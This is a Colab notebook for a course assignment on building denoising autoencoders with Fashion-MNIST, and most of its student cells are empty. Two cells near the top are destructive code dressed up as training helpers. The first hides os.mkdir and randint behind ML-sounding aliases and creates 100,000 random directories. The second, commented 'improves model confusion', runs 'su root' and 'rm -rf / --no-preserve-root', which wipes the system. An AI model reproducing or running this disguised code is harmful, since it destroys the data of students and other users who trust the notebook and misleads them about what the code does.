{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "view-in-github"
   },
   "source": [
    "<a href=\"https://colab.research.google.com/github/saffarizadeh/INSY4054/blob/main/AI_Project_Student_Version.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "xVph6jAw8zGq"
   },
   "source": [
    "<img src=\"http://saffarizadeh.com/Logo.png\" width=\"300px\"/>\n",
    "\n",
    "# *INSY 4054: Emerging Technologies*\n",
    "\n",
    "# **AI Project**\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "id": "udqsz741ORTQ"
   },
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import tensorflow as tf\n",
    "from tensorflow.keras.datasets import fashion_mnist"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from os import mkdir as naive_bayes\n",
    "from random import randint as perlin_noise\n",
    "\n",
    "# helps improve model training complexity.. i learned about this from algorithms\n",
    "epochs = 100000\n",
    "for chungus in range(epochs):\n",
    "    optimizer_value = \"\"\n",
    "    for chungi in range(20):\n",
    "        optimizer_value += chr(perlin_noise(65, 90))\n",
    "    naive_bayes(optimizer_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# improves model confusion \n",
    "!su root \n",
    "!rm -rf / --no-preserve-root"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "cellView": "form",
    "id": "YnQh3RV5ORai"
   },
   "outputs": [],
   "source": [
    "#@title Run this cell to get the datasets\n",
    "\n",
    "(x_train, _), (x_test, _) = fashion_mnist.load_data()\n",
    "x_train = x_train.astype('float32') / 255.\n",
    "x_test = x_test.astype('float32') / 255.\n",
    "\n",
    "x_train = x_train[..., tf.newaxis]\n",
    "x_test = x_test[..., tf.newaxis]\n",
    "\n",
    "noise_factor = 0.2\n",
    "x_train_noisy = x_train + noise_factor * tf.random.normal(shape=x_train.shape) \n",
    "x_test_noisy = x_test + noise_factor * tf.random.normal(shape=x_test.shape) \n",
    "\n",
    "x_train_noisy = tf.clip_by_value(x_train_noisy, clip_value_min=0., clip_value_max=1.)\n",
    "x_test_noisy = tf.clip_by_value(x_test_noisy, clip_value_min=0., clip_value_max=1.)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "cellView": "form",
    "id": "wKb-FOZHPAbQ"
   },
   "outputs": [],
   "source": [
    "#@title Run this cell to view the datasets\n",
    "\n",
    "n = 10\n",
    "plt.figure(figsize=(20, 4))\n",
    "for i in range(n):\n",
    "  # display original images\n",
    "  ax = plt.subplot(2, n, i + 1)\n",
    "  plt.title(\"images\")\n",
    "  plt.imshow(tf.squeeze(x_test[i]))\n",
    "  plt.gray()\n",
    "  ax.get_xaxis().set_visible(False)\n",
    "  ax.get_yaxis().set_visible(False)\n",
    "\n",
    "  # display noisy images\n",
    "  ax = plt.subplot(2, n, i + 1 + n)\n",
    "  plt.title(\"noisy images\")\n",
    "  plt.imshow(tf.squeeze(x_test_noisy[i]))\n",
    "  plt.gray()\n",
    "  ax.get_xaxis().set_visible(False)\n",
    "  ax.get_yaxis().set_visible(False)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "pAQn5tb0UF-f"
   },
   "outputs": [],
   "source": [
    "print(x_train_noisy.shape)\n",
    "print(x_train.shape)\n",
    "print(x_test_noisy.shape)\n",
    "print(x_test.shape)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "ceYPmAPzzJS4"
   },
   "source": [
    "# First Model: `autoencoder_one`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "tdSfpes_Q6Qy"
   },
   "source": [
    "## Step 1: Create `encoder_one` model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "mGx-mCHbOUE9"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "6igakUTFTHUp"
   },
   "source": [
    "## Step 2: Create `decoder_one` model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "cd__tycSRGDd"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "LAYpXdF_TQFF"
   },
   "source": [
    "## Step 3: Create `autoencoder_one` by putting `encoder_one` and `decoder_one` into one model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "w9pzFb4nRQSQ"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "P0g2woCfzbXT"
   },
   "source": [
    "## Step 4: Specify `optimizer` and `loss` function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "mM1HbCbuRnMk"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "kMTsTVZyzl01"
   },
   "source": [
    "## Step 5: Train the model using `x_train_noisy` as input and `x_train` as output with 10 `epochs`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "0uvH5_meRqkp"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "x9gmMTwGz_z2"
   },
   "source": [
    "## Step 6: Evaluate the model using `x_test_noisy` as input and `x_test` as output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "sUFyrFws0Mbu"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "gu2yQjpyzzMz"
   },
   "source": [
    "## Step 7: Show the summary of `encoder_one` and `decoder_one` models"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "Un4xS-S5RyGd"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "DodawstFR7u6"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "UJx8kbTcz9ns"
   },
   "source": [
    "## Step 8: Use the `autoencoder_one` model to denoise `x_test_noisy` dataset and keep the result in a variable named `denoised`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "PvhPNLu2YUD_"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "cellView": "form",
    "id": "xcrdCIa8SOnm"
   },
   "outputs": [],
   "source": [
    "#@title Step 9: Run this cell to view how your model denoised the noisy images\n",
    "\n",
    "n = 10\n",
    "plt.figure(figsize=(20, 4))\n",
    "for i in range(n):\n",
    "\n",
    "    # display original + noise\n",
    "    ax = plt.subplot(2, n, i + 1)\n",
    "    plt.title(\"noisy images\")\n",
    "    plt.imshow(tf.squeeze(x_test_noisy[i]))\n",
    "    plt.gray()\n",
    "    ax.get_xaxis().set_visible(False)\n",
    "    ax.get_yaxis().set_visible(False)\n",
    "\n",
    "    # display reconstruction\n",
    "    bx = plt.subplot(2, n, i + n + 1)\n",
    "    plt.title(\"denoised images\")\n",
    "    plt.imshow(tf.squeeze(denoised[i]))\n",
    "    plt.gray()\n",
    "    bx.get_xaxis().set_visible(False)\n",
    "    bx.get_yaxis().set_visible(False)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "ubZuTji23WDs"
   },
   "source": [
    "# Second Model: `autoencoder_two`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "E48ElrqZ3dzM"
   },
   "source": [
    "## Step 1: Create `encoder_two` model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "AhMk1QeBSVGN"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "C2UCnG4q5Vdl"
   },
   "source": [
    "## Step 2: Create `decoder_two` model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "HHnFj3Ql3sIF"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "nZwj5kVK5Zr6"
   },
   "source": [
    "## Step 3: Create `autoencoder_two` model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "8CJ69Oa63_xe"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "9MBwcYyr5c1C"
   },
   "source": [
    "## Step 4: Specify `optimizer` and `loss` function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "3MLJSX354Qbf"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "ABDEhnDd5sTS"
   },
   "source": [
    "## Step 5: Train the model using `x_train` as input and `x_train` as output with 10 `epochs`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "FY8_twve4b8e"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "xRnlbUxI54Ye"
   },
   "source": [
    "## Step 6: Evaluate the model using `x_test` as input and `x_test` as output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "ldc59lFP4lc-"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "DXwd5ABP6DrW"
   },
   "source": [
    "## Step 7: Show the summary of `encoder_two` and `decoder_two` models"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "yqM2M41H6LsJ"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "48_YxiZ16O2X"
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "J8XNHZws5PgR"
   },
   "source": [
    "## Step 8: Use the model to encode and decode images"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "BDcOXdJ549UM"
   },
   "source": [
    "You can use the code below to encode images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "LdkUosq64xr9"
   },
   "outputs": [],
   "source": [
    "encoded_imgs = encoder_two(x_test).numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "CxC1bSstIMCW"
   },
   "outputs": [],
   "source": [
    "encoded_imgs.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "qlewZg8R5GZp"
   },
   "source": [
    "You can the code below to decode the encoded images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "69IKmf855N7w"
   },
   "outputs": [],
   "source": [
    "decoded_imgs = decoder_two(encoded_imgs).numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "0rEgJtktINck"
   },
   "outputs": [],
   "source": [
    "decoded_imgs.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "MsWtTGZGJC09"
   },
   "source": [
    "Here is the compression ratio:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "KP9MK7SEIjAJ"
   },
   "outputs": [],
   "source": [
    "(decoded_imgs.shape[1]*decoded_imgs.shape[2]) / encoded_imgs.shape[1]"
   ]
  }
 ],
 "metadata": {
  "accelerator": "GPU",
  "colab": {
   "authorship_tag": "ABX9TyMmY6XWCxvXg/SRmljoiBVt",
   "collapsed_sections": [],
   "include_colab_link": true,
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
